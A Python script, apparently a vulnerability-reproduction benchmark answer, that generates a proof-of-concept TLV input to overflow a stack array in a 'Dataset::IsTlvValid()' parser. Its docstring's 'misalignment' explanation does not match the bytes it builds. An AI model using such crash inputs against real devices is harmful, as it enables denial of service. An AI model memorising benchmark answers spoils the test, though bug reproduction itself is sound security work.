import os

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Stack Buffer Overflow
    in the `Dataset::IsTlvValid()` method.
    """
    def solve(self, src_path: str) -> bytes:
        """
        The vulnerability is a missing minimum length check for certain TLV types,
        including Active Timestamp (type 14). This allows a TLV with an incorrect
        length (e.g., 1 instead of 8) to be processed.

        The `IsTlvValid` function iterates through TLVs. The `Tlv::GetNext()` method
        calculates the position of the next TLV based on the current TLV's `Length`
        field. By providing a length of 1 for the Active Timestamp TLV, we cause the
        parser to become misaligned. The parser then interprets subsequent bytes
        from an incorrect offset.

        We craft these subsequent bytes to be a long sequence of minimal, 2-byte
        TLVs of the form `[Type, Length=0]`.

        Inside `IsTlvValid`, a stack-allocated array `Tlv::Type types[kMaxTlvTypes]`
        (where `kMaxTlvTypes` is 32) tracks encountered TLV types to check for
        duplicates. By feeding the misaligned parser a stream that it interprets
        as more than 32 unique TLVs, we cause an out-of-bounds write to this `types`
        array, triggering a stack buffer overflow.

        The PoC is constructed as follows:
        1. A malformed Active Timestamp TLV: `[type=14, length=1, value=0x00]`.
           This initiates the parser misalignment.
        2. A series of unique, minimal TLVs `[type, length=0]` filling the rest of
           the maximum allowed dataset size (254 bytes). This ensures that the
           number of parsed TLVs exceeds 32, triggering the overflow.
        """

        # The Dataset mTlvs buffer has a maximum size of 254 bytes.
        max_size = 254
        
        poc = bytearray()
        
        # 1. Malformed Active Timestamp TLV (type 0x0e = 14) with length 1.
        # This is the entry point for the vulnerability.
        poc.extend(b'\x0e\x01\x00')
        
        # A set to track used TLV types to avoid failing the duplicate check.
        seen_types = {14}
        
        # 2. Fill the rest of the buffer with unique, minimal TLVs of the
        #    form [type, length=0].
        current_type = 0
        while len(poc) <= max_size - 2:  # Ensure there's space for a 2-byte TLV.
            if current_type not in seen_types:
                poc.extend([current_type, 0])
                seen_types.add(current_type)
            
            # The type is a uint8_t, so wrap around if necessary.
            current_type = (current_type + 1) % 256
        
        # The final PoC will have a length of 253 bytes and contain 126 unique TLVs,
        # which is sufficient to overflow the `types[32]` array on the stack.
        return bytes(poc)